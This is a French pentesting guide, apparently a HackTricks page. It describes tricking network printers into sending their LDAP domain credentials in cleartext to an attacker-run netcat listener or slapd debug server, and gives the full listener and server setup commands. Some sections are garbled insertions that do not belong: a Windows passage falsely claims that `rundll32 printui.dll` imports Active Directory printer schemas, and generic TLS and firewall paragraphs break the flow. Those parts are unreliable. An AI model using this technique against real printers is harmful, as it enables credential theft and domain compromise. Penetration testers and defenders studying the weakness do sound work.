Plusieurs blogs sur Internet **mettent en évidence les dangers de laisser les imprimantes configurées avec LDAP avec des identifiants de connexion par défaut/faibles**.\
Cela est dû au fait qu'un attaquant pourrait **tromper l'imprimante pour s'authentifier contre un serveur LDAP malveillant** (généralement un `nc -vv -l -p 444` suffit) et capturer les **identifiants de l'imprimante en clair**.

De plus, plusieurs imprimantes contiendront des **logs avec des noms d'utilisateur** ou pourraient même être capables de **télécharger tous les noms d'utilisateur** du contrôleur de domaine.

Toutes ces **informations sensibles** et le **manque de sécurité** commun rendent les imprimantes très intéressantes pour les attaquants.

Quelques blogs sur le sujet :

* [https://www.ceos3c.com/hacking/obtaining-domain-credentials-printer-netcat/](https://www.ceos3c.com/hacking/obtaining-domain-credentials-printer-netcat/)
* [https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)

**Les informations suivantes ont été copiées depuis** [**https://grimhacker.com/2018/03/09/just-a-printer/**](https://grimhacker.com/2018/03/09/just-a-printer/)

# Paramètres LDAP

Sur les imprimantes Konica Minolta, il est possible de configurer un serveur LDAP auquel se connecter, ainsi que des identifiants. Dans les versions antérieures du micrologiciel de ces appareils, j'ai entendu dire qu'il était possible de récupérer les identifiants simplement en lisant la source html de la page. Maintenant, cependant, les identifiants ne sont pas renvoyés dans l'interface, nous devons donc travailler un peu plus dur.

La liste des serveurs LDAP se trouve sous : Réseau > Paramètres LDAP > Configuration de LDAP

L'interface permet de modifier le serveur LDAP sans réintroduire les identifiants qui seront utilisés pour se connecter. Je présume que cela est destiné à une expérience utilisateur plus simple, mais cela donne l'occasion à un attaquant de passer de maître d'une imprimante à une prise de pied sur le domaine.

Nous pouvons reconfigurer le paramètre d'adresse du serveur LDAP vers une machine que nous contrôlons et déclencher une connexion avec la fonctionnalité "Test de connexion" utile.

# Écoute des informations

## netcat

Si vous avez plus de chance que moi, vous pourriez vous en sortir avec un simple écouteur netcat :
```
sudo nc -k -v -l -p 386
```
Je suis assuré par [@\_castleinthesky](https://twitter.com/\_castleinthesky) que cela fonctionne la plupart du temps, mais je n'ai pas encore eu la chance d'avoir une telle facilité.

## Slapd

J'ai constaté qu'un serveur LDAP complet est nécessaire car l'imprimante tente d'abord une liaison nulle, puis interroge les informations disponibles, et ce n'est que si ces opérations réussissent qu'elle procède à la liaison avec les informations d'identification.

J'ai cherché un serveur LDAP simple qui répondait aux exigences, mais il semblait y avoir des options limitées. En fin de compte, j'ai opté pour la mise en place d'un serveur LDAP ouvert et j'ai utilisé le service de serveur de débogage slapd pour accepter les connexions et imprimer les messages de l'imprimante. (Si vous connaissez une alternative plus facile, je serais heureux de l'entendre)

### Installation

(Notez que cette section est une version légèrement adaptée du guide ici [https://www.server-world.info/en/note?os=Fedora\_26\&p=openldap](https://www.server-world.info/en/note?os=Fedora\_26\&p=openldap) )

À partir d'un terminal root :

**Installer OpenLDAP,**
```
#> dnf install -y install openldap-servers openldap-clients

#> cp /usr/share/openldap-servers/DB_CONFIG.example /var/lib/ldap/DB_CONFIG 

#> chown ldap. /var/lib/ldap/DB_CONFIG
```
**Définir un mot de passe administrateur OpenLDAP (vous en aurez besoin à nouveau sous peu)**
```
#> slappasswd 
New password:
Re-enter new password:
{SSHA}xxxxxxxxxxxxxxxxxxxxxxxx
```

```
#> vim chrootpw.ldif
# specify the password generated above for "olcRootPW" section
dn: olcDatabase={0}config,cn=config
changetype: modify
add: olcRootPW
olcRootPW: {SSHA}xxxxxxxxxxxxxxxxxxxxxxxx
```

```
#> ldapadd -Y EXTERNAL -H ldapi:/// -f chrootpw.ldif
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
modifying entry "olcDatabase={0}config,cn=config"
```
**Importer les schémas de base**

---

**Description**

Lorsque vous installez un nouveau serveur d'impression, il est recommandé d'importer les schémas de base pour les imprimantes. Cela permet de stocker des informations supplémentaires sur les imprimantes dans Active Directory, telles que le nom de l'imprimante, le modèle, l'emplacement, etc.

**Instructions**

1. Ouvrez une invite de commande en tant qu'administrateur.
2. Accédez au répertoire où se trouvent les fichiers de schéma. Par exemple, `C:\Windows\System32\Printing_Admin_Scripts\fr-FR`.
3. Exécutez la commande suivante pour importer les schémas de base :

```
rundll32 printui.dll,PrintUIEntry /il /f [nom du fichier de schéma]
```

4. Répétez cette étape pour chaque fichier de schéma que vous souhaitez importer.

**Exemple**

```
rundll32 printui.dll,PrintUIEntry /il /f "C:\Windows\System32\Printing_Admin_Scripts\fr-FR\prnms003.inf"
```

**Résultat attendu**

Les schémas de base pour les imprimantes sont importés avec succès dans Active Directory.
```
#> ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/cosine.ldif 
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
adding new entry "cn=cosine,cn=schema,cn=config"

#> ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/nis.ldif 
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
adding new entry "cn=nis,cn=schema,cn=config"

#> ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/inetorgperson.ldif 
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
adding new entry "cn=inetorgperson,cn=schema,cn=config"
```
**Définir le nom de votre domaine dans la base de données LDAP.**
```
# generate directory manager's password
#> slappasswd 
New password:
Re-enter new password:
{SSHA}xxxxxxxxxxxxxxxxxxxxxxxx

#> vim chdomain.ldif
# specify the password generated above for "olcRootPW" section
dn: olcDatabase={1}monitor,cn=config
changetype: modify
replace: olcAccess
olcAccess: {0}to * by dn.base="gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth"
read by dn.base="cn=Manager,dc=foo,dc=bar" read by * none

dn: olcDatabase={2}mdb,cn=config
changetype: modify
replace: olcSuffix
olcSuffix: dc=foo,dc=bar

dn: olcDatabase={2}mdb,cn=config
changetype: modify
replace: olcRootDN
olcRootDN: cn=Manager,dc=foo,dc=bar

dn: olcDatabase={2}mdb,cn=config
changetype: modify
add: olcRootPW
olcRootPW: {SSHA}xxxxxxxxxxxxxxxxxxxxxxxx

dn: olcDatabase={2}mdb,cn=config
changetype: modify
add: olcAccess
olcAccess: {0}to attrs=userPassword,shadowLastChange by
dn="cn=Manager,dc=foo,dc=bar" write by anonymous auth by self write by * none
olcAccess: {1}to dn.base="" by * read
olcAccess: {2}to * by dn="cn=Manager,dc=foo,dc=bar" write by * read

#> ldapmodify -Y EXTERNAL -H ldapi:/// -f chdomain.ldif 
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
modifying entry "olcDatabase={1}monitor,cn=config"

modifying entry "olcDatabase={2}mdb,cn=config"

modifying entry "olcDatabase={2}mdb,cn=config"

modifying entry "olcDatabase={2}mdb,cn=config"

modifying entry "olcDatabase={2}mdb,cn=config"

#> vim basedomain.ldif
dn: dc=foo,dc=bar
objectClass: top
objectClass: dcObject
objectclass: organization
o: Foo Bar
dc: DC1

dn: cn=Manager,dc=foo,dc=bar
objectClass: organizationalRole
cn: Manager
description: Directory Manager

dn: ou=People,dc=foo,dc=bar
objectClass: organizationalUnit
ou: People

dn: ou=Group,dc=foo,dc=bar
objectClass: organizationalUnit
ou: Group

#> ldapadd -x -D cn=Manager,dc=foo,dc=bar -W -f basedomain.ldif 
Enter LDAP Password: # directory manager's password
adding new entry "dc=foo,dc=bar"

adding new entry "cn=Manager,dc=foo,dc=bar"

adding new entry "ou=People,dc=foo,dc=bar"

adding new entry "ou=Group,dc=foo,dc=bar"
```
**Configurer LDAP TLS**

**Créer un certificat SSL**
```
#> cd /etc/pki/tls/certs 
#> make server.key 
umask 77 ; \
/usr/bin/openssl genrsa -aes128 2048 > server.key
Generating RSA private key, 2048 bit long modulus
...
...
e is 65537 (0x10001)
Enter pass phrase: # set passphrase
Verifying - Enter pass phrase: # confirm

# remove passphrase from private key
#> openssl rsa -in server.key -out server.key 
Enter pass phrase for server.key: # input passphrase
writing RSA key

#> make server.csr 
umask 77 ; \
/usr/bin/openssl req -utf8 -new -key server.key -out server.csr
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [XX]: # country
State or Province Name (full name) []: # state
Locality Name (eg, city) [Default City]: # city
Organization Name (eg, company) [Default Company Ltd]: # company
Organizational Unit Name (eg, section) []:Foo Bar # department
Common Name (eg, your name or your server's hostname) []:www.foo.bar # server's FQDN
Email Address []:xxx@foo.bar # admin email
Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []: # Enter
An optional company name []: # Enter

#> openssl x509 -in server.csr -out server.crt -req -signkey server.key -days 3650
Signature ok
subject=/C=/ST=/L=/O=/OU=Foo Bar/CN=dlp.foo.bar/emailAddress=xxx@roo.bar
Getting Private key
```
**Configurer Slapd pour SSL/TLS**

Pour sécuriser les communications entre les clients et le serveur LDAP, il est recommandé de configurer Slapd pour utiliser SSL/TLS. Voici les étapes à suivre pour configurer Slapd pour SSL/TLS :

1. Générer un certificat SSL/TLS pour le serveur LDAP. Vous pouvez utiliser un certificat auto-signé ou un certificat signé par une autorité de certification (CA) de confiance.

2. Ajouter les paramètres suivants au fichier de configuration de Slapd (/etc/openldap/slapd.conf ou /etc/ldap/slapd.conf) :

```
TLSCertificateFile /path/to/ldap.crt
TLSCertificateKeyFile /path/to/ldap.key
```

Assurez-vous de remplacer `/path/to/ldap.crt` et `/path/to/ldap.key` par les chemins d'accès appropriés vers le certificat et la clé privée SSL/TLS que vous avez générés à l'étape 1.

3. Redémarrez le service Slapd pour que les modifications prennent effet.

4. Vérifiez que Slapd utilise SSL/TLS en exécutant la commande suivante :

```
ldapsearch -H ldaps://localhost -x -b "dc=example,dc=com" -D "cn=admin,dc=example,dc=com" -W
```

Assurez-vous de remplacer `dc=example,dc=com` par le nom de votre domaine LDAP et `cn=admin,dc=example,dc=com` par le nom d'utilisateur et le DN de l'administrateur LDAP.

Si la commande ldapsearch réussit, cela signifie que Slapd utilise SSL/TLS pour les communications.
```
#> cp /etc/pki/tls/certs/server.key \
/etc/pki/tls/certs/server.crt \
/etc/pki/tls/certs/ca-bundle.crt \
/etc/openldap/certs/

#> chown ldap. /etc/openldap/certs/server.key \
/etc/openldap/certs/server.crt \
/etc/openldap/certs/ca-bundle.crt

#> vim mod_ssl.ldif
# create new
 dn: cn=config
changetype: modify
add: olcTLSCACertificateFile
olcTLSCACertificateFile: /etc/openldap/certs/ca-bundle.crt
-
replace: olcTLSCertificateFile
olcTLSCertificateFile: /etc/openldap/certs/server.crt
-
replace: olcTLSCertificateKeyFile
olcTLSCertificateKeyFile: /etc/openldap/certs/server.key

#> ldapmodify -Y EXTERNAL -H ldapi:/// -f mod_ssl.ldif 
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
modifying entry "cn=config"
```
**Autoriser LDAP à travers votre pare-feu local**

Pour récupérer des informations sur les utilisateurs et les groupes à partir d'un domaine Active Directory, il est nécessaire d'autoriser le trafic LDAP à travers votre pare-feu local. Cela peut être fait en ouvrant le port 389 pour le trafic LDAP non sécurisé ou le port 636 pour le trafic LDAP sécurisé (LDAPS). Assurez-vous de limiter l'accès à ces ports uniquement aux adresses IP autorisées pour des raisons de sécurité.
```
firewall-cmd --add-service={ldap,ldaps}
```
## La récompense

Une fois que vous avez installé et configuré votre service LDAP, vous pouvez l'exécuter avec la commande suivante :

> ```
> slapd -d 2
> ```

La capture d'écran ci-dessous montre un exemple de la sortie lorsque nous exécutons le test de connexion sur l'imprimante. Comme vous pouvez le voir, le nom d'utilisateur et le mot de passe sont transmis du client LDAP au serveur.

![slapd terminal output containing the username "MyUser" and password "MyPassword"](https://i1.wp.com/grimhacker.com/wp-content/uploads/2018/03/slapd\_output.png?resize=474%2C163\&ssl=1)

# À quel point cela peut-il être mauvais ?

Cela dépend beaucoup des informations d'identification qui ont été configurées.

Si le principe du moindre privilège est suivi, vous pouvez n'obtenir qu'un accès en lecture à certains éléments de l'annuaire actif. Cela est souvent encore précieux car vous pouvez utiliser ces informations pour formuler d'autres attaques plus précises.

En général, vous êtes susceptible d'obtenir un compte dans le groupe Domain Users, ce qui peut donner accès à des informations sensibles ou constituer l'authentification préalable à d'autres attaques.

Ou, comme moi, vous pouvez être récompensé pour la mise en place d'un serveur LDAP et vous voir remettre un compte Domain Admin sur un plateau d'argent.


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Travaillez-vous dans une entreprise de **cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
